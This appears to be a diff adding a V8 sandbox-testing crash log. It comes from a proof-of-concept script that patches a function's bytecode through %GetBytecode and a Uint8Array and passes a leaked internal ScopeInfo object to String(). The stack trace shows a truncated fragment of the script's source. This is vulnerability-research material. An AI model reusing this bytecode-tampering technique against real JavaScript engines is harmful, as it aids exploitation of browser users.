@@ -1,0 +1,59 @@
+Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
+Sandbox bounds: [0x133500000000,0x143500000000)
+start
+Stacktrace:
+    ptr0=0x13350101f515
+    ptr1=(nil)
+    ptr2=(nil)
+    ptr3=(nil)
+    ptr4=(nil)
+    ptr5=(nil)
+    failure_message_object=0x7ffffffbc3a8
+
+==== JS stack trace =========================================
+
+    0: ExitFrame [pc: 0x55555700b876]
+    1: StubFrame [pc: 0x55555705e994]
+    2: String(aka String) [0x13350100d6a5](this=0x133500000011 <undefined>,0x13350101f515 <ScopeInfo FUNCTION_SCOPE>)
+    3: /* anonymous */ [0x13350101f445] [bugs/v8/c18-bytecode-trust/poc/h34-scopeinfo-string-only.js:21] [bytecode=0x3ffd01000111 offset=205](this=0x133501004929 <JSGlobalProxy>)
+    4: InternalFrame [pc: 0x555556f5369c]
+    5: EntryFrame [pc: 0x555556f533eb]
+
+==== Details ================================================
+
+[0]: ExitFrame [pc: 0x55555700b876]
+[1]: StubFrame [pc: 0x55555705e994]
+[2]: String(aka String) [0x13350100d6a5](this=0x133500000011 <undefined>,0x13350101f515 <ScopeInfo FUNCTION_SCOPE>) {
+// optimized frame
+--------- s o u r c e   c o d e ---------
+<No Source>
+-----------------------------------------
+}
+[3]: /* anonymous */ [0x13350101f445] [bugs/v8/c18-bytecode-trust/poc/h34-scopeinfo-string-only.js:21] [bytecode=0x3ffd01000111 offset=205](this=0x133501004929 <JSGlobalProxy>) {
+  // heap-allocated locals
+  var bc = 0x133501020ef5 <ContextCell[const=0x133501020e51 <Object map = 0x13350101f8ad>]>
+  var bytes = 0x133501020f49 <ContextCell[const=0x133501020f0d <Uint8Array map = 0x13350100d541>]>
+  var r = 0x133501020f7d <ContextCell[const=0x13350101f515 <ScopeInfo FUNCTION_SCOPE>]>
+  var box = 0x133501020fc5 <ContextCell[const=0x133501020fb5 <Object map = 0x13350101f91d>]>
+  // expression stack (top to bottom)
+  [08] : 0x133500000011 <undefined>
+  [07] : 0x13350101f515 <ScopeInfo FUNCTION_SCOPE>
+  [06] : 0x13350101f515 <ScopeInfo FUNCTION_SCOPE>
+  [05] : 0x13350100d6a5 <JSFunction String (sfi = 0x1335001acfad)>
+  [04] : 0x13350000573d <String[6]: #string>
+  [03] : 0x133501017f79 <JSFunction print (sfi = 0x133501017f49)>
+  [02] : 1000
+  [01] : 4
+  [00] : 0x133500000011 <undefined>
+--------- s o u r c e   c o d e ---------
+// C18 H34: isolated String() over poisoned property.\x0avar C18_H34_GLOBAL = 13;\x0afunction f() {\x0a  return C18_H34_GLOBAL;\x0a}\x0a\x0afor (let i = 0; i < 1000; i++) f();\x0a\x0alet bc = %GetBytecode(f);\x0alet bytes = new Uint8Array(bc.bytecode);\x0afor (let i = 0; i < bytes.length; i++) {\x0a  if (bytes[i] === 0x23) bytes[i ...
+
+-----------------------------------------
+}
+
+[4]: InternalFrame [pc: 0x555556f5369c]
+[5]: EntryFrame [pc: 0x555556f533eb]
+=====================
+
+
+EXIT:0
